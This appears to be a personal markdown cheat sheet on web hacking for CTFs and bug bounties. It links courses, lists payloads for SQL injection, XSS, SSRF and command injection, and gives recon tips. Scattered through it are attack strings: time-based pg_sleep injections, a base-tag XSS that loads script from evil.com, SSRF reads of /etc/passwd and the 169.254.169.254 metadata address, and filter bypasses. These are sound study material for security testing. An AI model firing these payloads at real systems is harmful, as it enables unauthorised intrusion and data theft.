#  ► web
## Resources
### Courses

- [Web Security Academy](https://portswigger.net/web-security)
- [Pentesterlab](https://pentesterlab.com/)
- [OWASP-wstg](https://owasp.org/www-project-web-security-testing-guide/)
- [Hacker101](https://www.hackerone.com/hacker101)

### CTF

- [247/CTF](https://247ctf.com/)
- [websec.fr](http://websec.fr/)
- [webhacking.kr](https://webhacking.kr/)
- [CTF Challenge](https://ctfchallenge.co.uk/)
- [Hacker101 CTF](https://ctf.hacker101.com/)
- [Google XSS Game](https://xss-game.appspot.com/)
- [Natas - OverTheWire](https://overthewire.org/wargames/natas/)
- [pwnfunction XSS Game](https://xss.pwnfunction.com/)

### Vulnerable Apps

- [Juice Shop](https://owasp.org/www-project-juice-shop/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub](https://github.com/vulhub/vulhub)
- [DVWA](http://www.dvwa.co.uk/)

### Bug Bounty

- [Web Hacking 101](https://leanpub.com/web-hacking-101)
- [Real World Bug Hunting](https://www.amazon.in/Real-World-Bug-Hunting-Field-Hacking-ebook/dp/B072SQZ2LG)
- [Resources for Beginner Bug Bounty Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/)
- [Intigriti Article](https://kb.intigriti.com/en/articles/3471127-useful-resources-about-web-hacking-bug-bounty)

## Tips

- Test every input, make sure to disregard any client-side restrictions.
- Remember the source and DOM are different. Keep an eye out for the devtools.
- Be aware of double encodings, browsers automatically URL-encode certain things.
- If the same functionality is available under two different endpoints, test both.
- For example, image upload while registering, versus image upload while editing profile.
- The server might be Windows. Don't forget, in case of webshells, you might need different commands. 
- For a newline, somtimes you need CRLF, individual CR or LF might not work: `%0d%0a` (webhacking.kr - 38).
- Just because a request fails with one method doesn't mean it will fail with a different method. Try `PUT` instead of `GET`.
- Use HTTP method `OPTIONS` to know what methods are allowed on the endpoint.
- Sometimes, `Wappalyzer` may detect extra information in different pages (or in view-source).
- Keep noting interesting things. While jumping from one feature to the next you might forget something.
- To go directly into console in devtools `Ctrl-shift-J` similarly you can find shortcuts for other tabs.

## Burp Suite

- Set scope and remove tracking-like requests to reduce clutter.
- Burp hotkeys
    - Ctrl-R:       Send to repeater
    - Ctrl-space:   Repeat request
- Plugins
    - Flow / Logger++
    - Auto Repeater / Autorize 
    - Turbo Intruder
    - BurpBounty
    - Paraminer

## Bugs
### SQLi

- [Portswigger - SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) (doesn't include sqlite)
- Do a simple sanity check for `'` or `"` in payload. Try bypassing client side restrictions for input in fields such as date.
- Oracle comments don't work with semicolon. `OR 1=1--` might work when `OR 1=1;--` doesn't.
- MySQL comments `--` require a space after them to work `-- `.
- Remember to encode spaces to `+` and other url unsafe characters as well.
- When using `UNION` to extract `table_name`, make sure that it is positioned with a column that has the same datatype.
- In where clause, try to use quotes to cover table and column names.
- While `union` can be used with `select`, look for **stacked queries** to execute any SQL statement. Remember to commit.
- If any words are filtered, see if they are done recursively. If not, `selselectect` should work.
- If spaces are blacklisted, you can use alternates such as: `[tabs] %0a %00 %09 %0d /**/`
- If you are in the context of MySQL, you can use variables without explicitly defining them. For example if "admin" is being filtered, you can put "nimda" as one of the columns (say, id) and use `reverse(id)` in another column (webhacking.kr - 59).
- To just see tables created by the user in MySQL: `union select table_name,null,null from information_schema.tables where table_schema not in ('information_schema','mysql','performance_schema')`
- Syntax of LIMIT: `LIMIT offset,quantity` where offset starts from 0.
- [Portswigger - Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- For time-based, first figure out the max time a request can take.
- For faster blind-sqli execution, in the first pass check what characters `*i*` does the target string contain from `string.printable` and append it to a filtered list. Then in the second pass, from that filtered list of characters check the real order of the target string `i*`.
- Remember to start `substring(str,pos,len)` from `1` not `0`.
- Use `LIKE BINARY` for case-sensitive blind sqli matching.
- For postgres time-based, `||pg_sleep(10)`
- For postgres time-based conditions `'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
- To test for SQL injection: [source](https://twitter.com/pwntheweb/status/1253224265853198336)

```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```

sqlmap:

- If SQLmap stops in between, try pressing `Enter` or `Ctrl-c`
- Always use `--threads 10` to speed up.
- Output goes to `~/.sqlmap/output/`

### PHP

- Sometimes `<?` does not work but `<?php` does.
- Type confusion: If an array is passed to `strcmp()`, it will give a warning but the compare result returns 0.
- Object injection: If `unserialize()` is being used, you might be able to craft an object and use trampoline functions.
- Type juggling: `0e123` evaluates to `0`.
- For checking if any functions are blacklisted:
```php
var_dump(ini_get('safe_mode'));
var_dump(explode(',',ini_get('disable_functions')));
var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
```
- We can set a directory as base using `open_basedir`

### XSS

- [Portswigger - XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Portswigger - XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- When browsers parse tag attributes, they HTML-decode their values first. `<foo bar='z'>` is the same as `<foo bar='&#x7a;'>`
- AngularJS `ng-app` attribute is processed by AngularJS. Anything within `{{}}` will be executed.
- jQuery `attr()` used to change attributes, can act as a sink.
- Strings can be concatenated using minus `-` sign. In a js `eval` context you can use: `"-alert(1)-"`
- Chrome, Firefox, Safari encode `location.search` and `location.hash`. IE11 and Edge (pre-Chromium) don't encode sources.
- To pop XSS in `innerHTML` first load the script into `iframe srcdoc` then load that `iframe` into the `innerHTML`.
- If there are any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
- `<base href=//evil.com>` allows you to change all relative URLs. For example `<script src=/xss.js>` will use `evil.com` to retrieve `xss.js`.
- XSS can also be done through file-uploads in case HTML or SVG files are allowed to be uploaded.
- Blind XSS:
    - Read https://brutelogic.com.br/blog/blind-xss-code/ and get the code here: http://brutelogic.com.br/brutal/blind/index.txt
    - Use http://xss.rocks/xss.js for including an `alert()` js file.
    - Use http://xsshunter.com to test for blind xss.
- CSP Bypass:
    - In your devtools, look at the network tab and within the headers for the response, you'll see the CSP header.
    - You can also copy the url and put it into Google's CSP Evaluator at: https://csp-evaluator.withgoogle.com
    - If `default-src` is `self`, it can be problematic if the user can upload files.
- [XSS in postMessage](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-postmessage)

### XXE

- [PayloadAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- Types covered in websec academy:
    - Classic file retrieval
    - SSRF through XXE
    - Error based

### CSRF

- Try removing the anti-CSRF token altogether.
- Try submitting anti-CSRF token generated for one user in another user's session.
- Submitting forms through JavaScript: `document.getElementById("myForm").submit();` or `document.forms[0].submit();`

### Command Injection

- Try `|ls`.
- For time delays use `sleep 10` or `& ping -c 10 127.0.0.1 &`
- Redirect output to a file you can read using your browser.

### Recon

- Recon is a continuous process, keep scanning and diffing for subdomains (using git).
- Don't forget to look into the sources, interesting things might not always be inline.
- If you have multiple files containing subdomains, merge them using `$ cat file1.txt file2.txt | sort | uniq > out`
- If you have a subdomain, look for further subdomains for it.
- When one directory isn't accessible, try its subdirectories.

### SSRF

> talk: https://www.youtube.com/watch?v=o-tL9ULF0KI<br>
> slides: https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent

Basic Example: upload avatar via URL and triggers the following request

```
GET /api/v1/fetch?url=https://site.com/myfunnycatmeme.jpeg
Host: thesiteweareabouttpwn.com
```

Changing the URL parameter to something.internal.target.com may give us access to see internal assets
Not limited to http, you can use other protocols
- file:///etc/passwd
- gopher://
- ssh://

Hurdles:

- Problem: metadata or internal IPs are getting filtered
- Solution: Use a custom domain like meta.mydomain.com and point it to the asset you are trying to access (aws.mydomain.com -> 169.254.169.254)
- Problem: Only able to use whitelisted domains
- Solution: Find an open redirect on the whitelisted domain(s) and use that to exploit your SSRF
- Problem: SSRF is there but I can't see the output
- Solution: Use Javascript and exfil data

### Financially-Oriented

> https://twitter.com/irsdl/status/1115951243300691968

- Common bugs
    - TOCTOU and race conditions 
        - Transfering money, buying items, coupons
        - Changing order upon payment completion


### Understanding postMessage

Install apache and put these files in `/var/www/html` then open
`http://localhost/send.html`:

send.html

```html
<script>
        function send_message() {
                document.getElementById("frame").contentWindow.postMessage("konnichiwa", "http://localhost/receive.html");
        }
</script>

<iframe id="frame" onload="send_message()" src="receive.html"></iframe>
```

receive.html
```html
<script>
    window.addEventListener("message", function(message) {
        document.write("data: " + message.data + "<br>");
        document.write("origin: " + message.origin);
    });
</script>
```

To do in using `window.open` instead of `iframe`:

```js
window.addEventListener("message", function(message) {
    console.log(message.data);
});

myWindow = window.open("https://google.com","","height=500,width=500");
myWindow.postMessage("test","");
```

Sources:
- @vinodsparrow, @fransrosen, @detectify, @tomnomnom
- https://twitter.com/s0md3v/status/1256511604046340096
- https://twitter.com/xdavidhu/status/1262317923311509505
- https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/
- https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage

### API hacking

> https://www.youtube.com/watch?v=Gc7EUjRsrSo

- APIs are kind of like a proxy between client and dbs.
- Dissecting an API call:
    - Understand the API endpoint `GET /v2/users/1337`
    - Understand the GUID and tokens used.
    - Is there more than one version of the API?
    - Does the API support SOAP or REST?
    - Create multiple API calls and study them.
    - Try causing errors.
- Access Control:
    - Enumerate the user types.
    - Can one user have multiple types?
    - Does the API support cookies authorization?
    - Identify the session label (header, cookies, etc.)
- Broken object level access control (aka IDOR)
    - Try session label swapping.
    - Does the object have multiple representations (GUID, numbers)?
    - For `40X` errors, enumerate more IDs.
- Mass assignment
    - Don't guess object properties, find an endpoint that returns them and use it on another endpoint.
    - Looking at the values, understand how it might be parsed.
    - Mass assignment + CSRF: if two endpoints use different session label types (cookies in web, authorization header in mobile).
- Improper data filtering
    - APIs return sensitive data that's filtered by the client.
- Real traffic is better than documentation, use Burp to record your traffic.
- Use different clients - mobile / web / web for mobile.
- Use old versions - archive.org, apkpure.com
- Scan for older versions `v0.0` to `v5.0` in URL
- Find more endpoints:
    - Scan JS, APK and IPA file for strings.
    - Known docs: /swagger.json, /api-docs, /application.wadl, etc.
    - Find different hosts using the same API.
    - Look for niche features.
    - Other technologies: SOAP, GraphQL, Elastic Search, Websockets.
- Tend to be vulnerable:
    - Export injection
    - User management
    - Custom views of dashboard
    - Object sharing among users

> https://www.youtube.com/watch?v=ijalD2NkRFg
- Common API security issues:
    - Access controls
    - Input validation
    - Rate limiting
    - Restricting HTTP methods
    - 3rd party API abuse
    - App logic errors

- Access controls:
    - Enumerating restricted endpoints
    - Modifying session tokens
    - Reusing older session tokens
    - Bypass restrictions using IDOR
    - Using additional parameters
    - Modifying referer headers

- Input validation:
    - *anything* that the server takes in
    - Within the request header
    - GET and POST requests parameters
    - File uploads (PUT/DELETE) requests
    - Fuzzing: (speed up using HEAD requests)
        - RCE
        - XSS
        - (L/R)FI
        - (No)SQLi
        - Request splitting
        - Deserialization
        - XXE
        - SSTI
        - Encoding: junk, control chars, emojis
        - File upload
        - SSRF

- Rate limiting:
    - Unauthenticated requests
    - Authenticated requests
    - As a bot or as a developer
    - With a deactivated account
    - With false credentials

- Restricting HTTP methods:
    - What methods does the application expect
    - Can the methods be used on other endpoints

- 3rd party API abuse:
    - When APIs call other APIs
    - Request splitting: make request to 3rd party using target
    - SSRF: APIs which can resolve URLs can be tricked
    - Unhandled 3rd party input: unexpected errors

### Oauth

`TBD`

### AWS

- When hosting a site as an S3 bucket, the bucket name must match the domain name

### CRLF Injection / HTTP Response Splitting

- Send a requests such that the response reflects into the headers 
- Inject a CRLF to make the browser think that the response contains your header

### Subdomain takeovers

```
$ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain |
httprobe -prefer-https | nuclei -t
~/tools/web/nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml
```

### GitHub dorks

- `"example.com" ssh language:yaml` [source](https://twitter.com/ADITYASHENDE17/status/1262747235785138178)
- `http://chat.googleapis.com/v1/rooms` [source](https://twitter.com/uraniumhacker/status/1262193407616679936)

### GraphQL

- `https://graphql.org/learn/`
